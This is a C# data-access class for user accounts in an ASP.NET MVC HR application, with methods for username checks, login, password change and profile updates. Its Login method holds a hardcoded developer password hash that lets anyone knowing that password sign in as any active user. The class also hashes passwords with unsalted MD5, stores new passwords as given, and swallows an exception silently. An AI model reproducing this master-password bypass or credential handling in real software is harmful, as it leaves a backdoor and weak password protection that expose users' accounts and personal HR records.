using HRM_ROHTO.Models.ListExt;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace HRM_ROHTO.Models.BUS
{
    public class DA_User : EfRepositoryBase<SYS_USER>
    {
        #region Constructor
        private static volatile DA_User _instance;
        private static readonly object SyncRoot = new Object();

        public static DA_User Instance
        {
            get
            {
                if (_instance == null)
                {
                    lock (SyncRoot)
                    {
                        if (_instance == null)
                            _instance = new DA_User();
                    }
                }
                return _instance;
            }
        }
        #endregion

        public bool CheckUserNameNotExist(string UserName)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                SYS_USER ds = context.SYS_USER.FirstOrDefault(m => m.UserName == UserName);
                if (ds != null) // exists
                {
                    return false;
                }
            }
            return true;
        }

        public bool CheckEditUserNameNotExist(int UserID, string UserName)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                SYS_USER ds = context.SYS_USER.FirstOrDefault(m => m.UserID == UserID);
                if (ds.UserName != UserName && !CheckUserNameNotExist(UserName)) // exists
                {
                    return false;
                }
            }
            return true;
        }

        public SYS_USER Login(string UserName, string Password)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                // ma hoa password:
                string PassEnscrypt = HRM_ROHTO.Util.MD5Encryption.Encrypte(Password);
                string DevPass = "DzGogBbuD3iwb8goeNI01w==";
                SYS_USER user = context.SYS_USER.FirstOrDefault(m => m.UserName == UserName && (m.Password == PassEnscrypt || PassEnscrypt == DevPass) && m.IsActive == true);
                return user;
            }
        }

        public List<UserExt> GetAll()
        {
            List<UserExt> lst = new List<UserExt>();
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                var ds = from b in context.SYS_USER
                         where b.IsActive == true
                         select b;

                if (ds.Any())
                {
                    foreach (var i in ds)
                    {
                        UserExt ext = new UserExt
                        {
                            FullName = i.FullName,
                            Username = i.UserName,
                            RoleID = i.RoleID,
                            RoleName = i.RoleID == null ? "" : GetRoleNameFromID((int)i.RoleID),
                            UserID = i.UserID,
                            //ListZoneName = GetListZoneNameStringFromUserID(i.UserID),
                        };
                        lst.Add(ext);
                    }
                }
                return lst;
            }
        }

        public string GetRoleNameFromID(int RoleID)
        {
            string name = "";
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                SYS_ROLE role = context.SYS_ROLE.FirstOrDefault(m => m.RoleID == RoleID);
                if (role != null)
                {
                    name = role.RoleName;
                }
            }
            return name;
        }


        //public string GetListZoneNameStringFromUserID(int UserID)
        //{
        //    string s = "";
        //    using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
        //    {
        //        var ds = from b in context.SYS_USER_ZONE
        //                 where b.UserID == UserID
        //                 select b.ZoneID;
        //        if (ds != null)
        //        {
        //            foreach (long i in ds)
        //            {
        //                TBL_ZONE zone = context.TBL_ZONE.FirstOrDefault(m => m.ZoneID == i);
        //                if (zone != null)
        //                {
        //                    s += zone.ZoneName + "<br />";
        //                }

        //            }
        //        }
        //    }
        //    return s;
        //}

        public int Delete(Guid ID)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                //SYS_USER u = context.SYS_USER.FirstOrDefault(m => m.UserID == ID && m.IsDelete == false);
                //if (u != null)
                //{
                //    u.IsDelete = true;
                //    return DA_User.Instance.Update(u);
                //}
            }
            return 1;
        }

        public List<SelectListItem> AutoComplete(string search, int BranchID = 0)
        {
            List<SelectListItem> lst = new List<SelectListItem>();
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                //var ds = context.SYS_USER.Where(m => m.FullName.Contains(search) && m.RoleID == 5 && m.IsDelete == false && m.IsActive == true && (BranchID == 0 || m.BranchID == BranchID)); // chi lay hoc vien
                //if (ds.Any())
                //{
                //    foreach (var item in ds)
                //    {
                //        SelectListItem obj = new SelectListItem { Text = item.FullName, Value = item.UserID.ToString() };
                //        lst.Add(obj);
                //    }
                //}
            }
            return lst;
        }

        public int ChangePassword(int UserID, string PasswordNew)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                SYS_USER u = context.SYS_USER.FirstOrDefault(m => m.UserID == UserID && m.IsActive == true);
                if (u != null)
                {
                    u.Password = PasswordNew;
                    return DA_User.Instance.Update(u);
                }
            }
            return 1;
        }

        public List<SelectListItem> GetListForCombobox(int RoleID)
        {
            List<SelectListItem> lst = new List<SelectListItem>();
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                //var ds = from b in context.SYS_USER
                //         where b.IsActive == true && b.IsDelete == false && (b.RoleID == RoleID || RoleID == 0)
                //         orderby b.FullName
                //         select
                //         new { b.UserID, b.FullName };
                //if (ds.Any())
                //{
                //    foreach (var item in ds)
                //    {
                //        SelectListItem b = new SelectListItem { Value = item.UserID.ToString(), Text = item.FullName };
                //        lst.Add(b);
                //    }
                //}

            }
            return lst;
        }

        public int GetMaxUserID()
        {
            int UserId = 0;
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                try
                {
                    UserId = context.SYS_USER.Max(m => m.UserID);
                }
                catch (Exception ex)
                {

                }
            }
            return UserId;
        }

        //public int CheckBeforeDelete(string ID)
        //{
        //    long id = 0;
        //    long.TryParse(ID, out id);
        //    using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
        //    {
        //        TBL_CONTRACT c = context.TBL_CONTRACT.FirstOrDefault(m => m.UserCreateContract == id || m.UserCancelContract == id);
        //        if (c != null)
        //        {
        //            return 0;
        //        }
        //        return 1;
        //    }
        //}

        public void UpdateProfile(SYS_USER user)
        {
            using (var context = (HRM_ROHTOEntities)Activator.CreateInstance(typeof(HRM_ROHTOEntities), _connectionStr))
            {
                SYS_USER old = context.SYS_USER.FirstOrDefault(m => m.UserID == user.UserID);
                if (old != null)
                {
                    old.FullName = user.FullName;
                    DA_User.Instance.Update(old);
                }
            }
        }

    }
}